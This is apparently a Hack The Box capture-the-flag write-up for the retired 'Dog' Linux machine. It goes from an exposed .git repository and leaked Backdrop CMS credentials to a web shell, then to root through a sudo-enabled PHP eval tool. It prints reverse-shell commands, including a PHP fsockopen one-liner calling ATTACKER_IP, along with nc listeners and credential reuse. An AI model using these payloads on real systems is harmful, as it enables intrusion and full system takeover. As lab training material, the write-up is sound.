---
title: "🐕 HTB Dog Write-up"
name: Dog
date: 2025-07-13
last_modified_at: 2025-11-01
difficulty: Easy
os: Linux
skills: "Enumeration, Web Shell, Reverse Shell, Password Reuse, Sudo Privilege Exploit, PHP Code Injection, Privilege Escalation"
tools: "rustscan, nmap, git-dumper, searchsploit, EDB-ID 52021, revshells, nc, sudo"
published: true
---

![](images/Pasted%20image%2020250704102430.png)

## 🐾 Summary

In the "Dog" machine on Hack The Box, I went sniffing around a poorly secured `.git` directory and followed the trail all the way to root. 

Starting with just two open ports, I dug through the exposed Git repo and uncovered credentials hardcoded in a CMS config file. After logging in as the admin user, Tiffany, I bypassed a missing Zip PHP module by using a manual TAR upload to deploy a web shell. From there, a familiar sniff led to a `sudo`-enabled custom command (`bee`) that allowed PHP eval. One payload later, and I had root access. Woof!

This box was a classic case of developers leaving sensitive artefacts behind and underestimating the power of `sudo`. A solid beginner-to-intermediate machine with a great mix of enumeration, exploitation, and privilege escalation.

## 🐶 Dog care website

### 🔎 Recon 

**Initial scan** revealed only two ports open:
- `22/tcp`: OpenSSH 8.2
- `80/tcp`: Apache HTTP Server 2.4.41 with a `.git` directory!

```
fcoomans@kali:~/htb/dog$ rustscan -a 10.10.11.58 --tries 5 --ulimit 10000 -- -sCV -oA dog_tcp_all
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Scanning ports faster than you can say 'SYN ACK'

[~] The config file is expected to be at "/home/fcoomans/.rustscan.toml"
[~] Automatically increasing ulimit value to 10000.
Open 10.10.11.58:22
Open 10.10.11.58:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sCV -oA dog_tcp_all" on ip 10.10.11.58
Depending on the complexity of the script, results may take some time to appear.

<SNIP>

Nmap scan report for dog.htb (10.10.11.58)
Host is up, received echo-reply ttl 63 (0.17s latency).
Scanned at 2025-07-04 10:04:52 SAST for 13s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEJsqBRTZaxqvLcuvWuqOclXU1uxwUJv98W1TfLTgTYqIBzWAqQR7Y6fXBOUS6FQ9xctARWGM3w3AeDw+MW0j+iH83gc9J4mTFTBP8bXMgRqS2MtoeNgKWozPoy6wQjuRSUammW772o8rsU2lFPq3fJCoPgiC7dR4qmrWvgp5TV8GuExl7WugH6/cTGrjoqezALwRlKsDgmAl6TkAaWbCC1rQ244m58ymadXaAx5I5NuvCxbVtw32/eEuyqu+bnW8V2SdTTtLCNOe1Tq0XJz3mG9rw8oFH+Mqr142h81jKzyPO/YrbqZi2GvOGF+PNxMg+4kWLQ559we+7mLIT7ms0esal5O6GqIVPax0K21+GblcyRBCCNkawzQCObo5rdvtELh0CPRkBkbOPo4CfXwd/DxMnijXzhR/lCLlb2bqYUMDxkfeMnmk8HRF+hbVQefbRC/+vWf61o2l0IFEr1IJo3BDtJy5m2IcWCeFX3ufk5Fme8LTzAsk6G9hROXnBZg8=
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM/NEdzq1MMEw7EsZsxWuDa+kSb+OmiGvYnPofRWZOOMhFgsGIWfg8KS4KiEUB2IjTtRovlVVot709BrZnCvU8Y=
|   256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPMpkoATGAIWQVbEl67rFecNZySrzt944Y/hWAyq4dPc
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 3836E83A3E835A26D789DDA9E78C5510
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
| http-robots.txt: 22 disallowed entries
| /core/ /profiles/ /README.md /web.config /admin
| /comment/reply /filter/tips /node/add /search /user/register
| /user/password /user/login /user/logout /?q=admin /?q=comment/reply
| /?q=filter/tips /?q=node/add /?q=search /?q=user/password
|_/?q=user/register /?q=user/login /?q=user/logout
|_http-title: Home | Dog
| http-git:
|   10.10.11.58:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

<SNIP>
```

After pointing `dog.htb` in `/etc/hosts`,
```
fcoomans@kali:~/htb/dog/git$ grep dog.htb /etc/hosts
10.10.11.58     dog.htb
```

With `git-dumper` (https://github.com/arthaud/git-dumper), I pulled the full Git repo and began analyzing the PHP source code.
```
fcoomans@kali:~/htb/dog$ git-dumper http://dog.htb/ git
[-] Testing http://dog.htb/.git/HEAD [200]
[-] Testing http://dog.htb/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://dog.htb/.gitignore [404]
[-] Fetching http://dog.htb/.git/ [200]
[-] http://dog.htb/.gitignore responded with status code 404
[-] Fetching http://dog.htb/.git/HEAD [200]
[-] Fetching http://dog.htb/.git/COMMIT_EDITMSG [200]
[-] Fetching http://dog.htb/.git/branches/ [200]

<SNIP>

[-] Fetching http://dog.htb/.git/objects/ff/d522e1da8660cb25dce831f19efa284753b691 [200]
[-] Fetching http://dog.htb/.git/objects/ff/e2bdb70e3508a43577a1e63d8f3e0eb1954bed [200]
[-] Fetching http://dog.htb/.git/objects/ff/f99b60388f8dabaa3ccb41a86ac100b29a75fa [200]
[-] Fetching http://dog.htb/.git/logs/refs/heads/master [200]
[-] Sanitizing .git/config
[-] Running git checkout .
Updated 2873 paths from the index
```

Looking at the installed modules reveals that the software used is `Backdrop CMS 1.27.1`.
```
fcoomans@kali:~/htb/dog$ cat git/core/modules/admin_bar/admin_bar.info
<SNIP>

; Added by Backdrop CMS packaging script on 2024-03-07
project = backdrop
version = 1.27.1
timestamp = 1709862662
```

`searchsploit` shows that this version is vulnerable to an Authenticated Remote Command Execution (RCE).
```
fcoomans@kali:~/htb/dog/git$ searchsploit backdrop 1.27.1
--------------------------------------------------- ---------------------------------
 Exploit Title                                     |  Path
--------------------------------------------------- ---------------------------------
Backdrop CMS 1.27.1 - Authenticated Remote Command | php/webapps/52021.py
--------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

I create a mirror copy of the exploit.
```
fcoomans@kali:~/htb/dog$ searchsploit -m 52021
  Exploit: Backdrop CMS 1.27.1 - Authenticated Remote Command Execution (RCE)
      URL: https://www.exploit-db.com/exploits/52021
     Path: /usr/share/exploitdb/exploits/php/webapps/52021.py
    Codes: N/A
 Verified: True
File Type: HTML document, Unicode text, UTF-8 text
Copied to: /home/fcoomans/htb/dog/52021.py
```

And run it.  It creates a `shell/` directory containing a web shell and a generates a shell.zip file with instructions where to upload the module and the URL to access the web shell.
```
fcoomans@kali:~/htb/dog$ python 52021.py http://dog.htb
Backdrop CMS 1.27.1 - Remote Command Execution Exploit
Evil module generating...
Evil module generated! shell.zip
Go to http://dog.htb/admin/modules/install and upload the shell.zip for Manual Installation.
Your shell address: http://dog.htb/modules/shell/shell.php
```

`settings.php` exposes the mySQL credentials with the password `BackDropJ2024DS2024`.
```
fcoomans@kali:~/htb/dog$ cat git/settings.php
<SNIP>
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
$database_prefix = '';
<SNIP>
```

The `update.settings.json` file shows an e-mail address for Tiffany.
```
fcoomans@kali:~/htb/dog$ cat git/files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json
<SNIP>
    "update_emails": [
        "tiffany@dog.htb"
    ],
<SNIP>
```

### 🧪 Exploitation

Logging in with `tiffany@dog.htb` and the password `BackDropJ2024DS2024` on http://dog.htb works.  Tiffany is an Administrator.

http://dog.htb/?q=admin/modules/install is opened but it says that Zip PHP is not installed.  This means the `shell.zip` file won't work.  I click on the `Manual installation` link.

![](images/Pasted%20image%2020250704101055.png)

`tar` is used to create a archive of the `shell` directory that was created by the exploit code.
```
fcoomans@kali:~/htb/dog$ tar cvzf shell.tar.gz shell
shell/
shell/shell.php
shell/shell.info
```

The new `shell.tar.gz` is installed as a module.

![](images/Pasted%20image%2020250704101258.png)

A `nc mkfifo` reverse shell payload is generated using https://www.revshells.com.

![](images/Pasted%20image%2020250704101957.png)

A `nc` listener is started on the attack host.
```
fcoomans@kali:~/htb/dog$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
```

The web shell is accessed on http://dog.htb/modules/shell/shell.php and the reverse shell payload is executed.

![](images/Pasted%20image%2020250713073157.png)

The `nc` listener catches the reverse shell.
```
fcoomans@kali:~/htb/dog$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [ATTACKER_IP] from (UNKNOWN) [10.10.11.58] 45670
bash: cannot set terminal process group (866): Inappropriate ioctl for device
bash: no job control in this shell
www-data@dog:/var/www/html/modules/shell$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@dog:/var/www/html/modules/shell$ ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:94:84:e4 brd ff:ff:ff:ff:ff:ff
    inet 10.10.11.58/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe94:84e4/64 scope link
       valid_lft forever preferred_lft forever
```

#### 👣 Foothold as johncusack

Looking at `/etc/passwd` shows two interesting accounts under `/home`:
- `jobert`
- `johncusack`
```
www-data@dog:/var/www/html/modules/shell$ grep sh /etc/passwd
grep sh /etc/passwd
root:x:0:0:root:/root:/bin/bash
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
jobert:x:1000:1000:jobert:/home/jobert:/bin/bash
johncusack:x:1001:1001:,,,:/home/johncusack:/bin/bash
```

Python is used to create an interactive PTY session.  This is needed to interact with prompts.
```
www-data@dog:/var/www/html/modules/shell$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<ell$ python3 -c 'import pty;pty.spawn("/bin/bash")'
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
```

The `BackDropJ2024DS2024` is tried with both users, but works with `johncusack`.
```
www-data@dog:/var/www/html/modules/shell$ su - johncusack
su - johncusack
Password: BackDropJ2024DS2024

johncusack@dog:~$ id
id
uid=1001(johncusack) gid=1001(johncusack) groups=1001(johncusack)
```

### 💰 Post Exploitation

#### 🚩 user.txt

John Cusack holds the `user.txt` flag.
```
johncusack@dog:~$ cat /home/johncusack/user.txt
cat /home/johncusack/user.txt
3271af84314fb04c73b739737880a695
```

## 🦸‍♂️ `sudo` to the rescue

### 🔎 Recon

Like Clark Kent heading into a phone booth, John Cusack transforms into root when armed with `sudo` and a vulnerable `bee` utility. This quirky command-line tool allowed arbitrary PHP code execution. With great power comes great responsibility — or in this case, a reverse shell.
```
johncusack@dog:~$ sudo -l
sudo -l
[sudo] password for johncusack: BackDropJ2024DS2024

Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```

The program contains an interesting `eval` command that allows for the execution of  PHP code.
```
johncusack@dog:~$ sudo /usr/local/bin/bee
sudo /usr/local/bin/bee
🐝 Bee
Usage: bee [global-options] <command> [options] [arguments]

Global Options:
 --root
 Specify the root directory of the Backdrop installation to use. If not set, will try to find the Backdrop installation automatically based on the current directory.

 --site

<SNIP>

 ADVANCED
  db-query
   dbq
   Execute a query using db_query().

  eval
   ev, php-eval
   Evaluate (run/execute) arbitrary PHP code after bootstrapping Backdrop.

  php-script
   scr
   Execute an arbitrary PHP file after bootstrapping Backdrop.

  sql
   sqlc, sql-cli, db-cli
   Open an SQL command-line interface using Backdrop's database credentials.
```

### 🧪 Exploitation

#### 🔼 Root via sudo

Running `bee` as `sudo` and asked to `eval` the PHP command `system("id");` returns the `root` user info.
```
johncusack@dog:~$ sudo /usr/local/bin/bee --root=/var/www/html eval 'system("id");'
<l/bin/bee --root=/var/www/html eval 'system("id");'
uid=0(root) gid=0(root) groups=0(root)
```

https://www.revshells.com is once again used to generate a PHP reverse shell payload.

![](images/Pasted%20image%2020250704102150.png)

A `nc` listener is started on the attack host.
```
fcoomans@kali:~/htb/dog$ rlwrap nc -lvnp 4445
listening on [any] 4445 ...
```

Time to unleash the final payload. One `fsockopen` and a bash process later, and I was running commands as root. 
```
johncusack@dog:~$ sudo /usr/local/bin/bee --root=/var/www/html eval '$sock=fsockopen("ATTACKER_IP",4445);$proc=proc_open("bash", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
<ash", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

The `nc` listener catches the rooted reverse shell. 🥳
```
fcoomans@kali:~/htb/dog$ rlwrap nc -lvnp 4445
listening on [any] 4445 ...
connect to [ATTACKER_IP] from (UNKNOWN) [10.10.11.58] 38016
id
uid=0(root) gid=0(root) groups=0(root)
python3 -c 'import pty;pty.spawn("/bin/bash")'
root@dog:/var/www/html# cd /root
```

### 💰 Post Exploitation

#### 🏆 root.txt flag

`root` is the holder of the `root.txt` flag.
```
root@dog:~# cat /root/root.txt
cat /root/root.txt
9a5e453ee6b084a145937f9c7e78f399
```

Tiffany let the dogs out, and `bee`-fore John knew it, I was digging up root. 🐕💻

And `Dog has been Pwned!` 🎉

![](images/Pasted%20image%2020250704102809.png)

## 📚 Lessons Learned

- **Even dogs bury bones where they shouldn’t** 
	Developers accidentally left sensitive credentials and configurations in `.git`. Always exclude `.git` from production.
- **Outdated CMS = chewing on bugs**
	Backdrop CMS had an RCE in this version. Patch your systems regularly or risk being bitten.
- **Not all** `sudo` **powers are safe**
	Giving users `sudo` rights over PHP-eval tools is like handing them a stick of dynamite with a bow on it.

## ⚠️ Disclaimer

This write-up covers a retired HTB machine and is for educational purposes only. All IPs, credentials, and flags exist in a lab environment. My username is intentionally used throughout this write-up to build my cybersecurity brand.

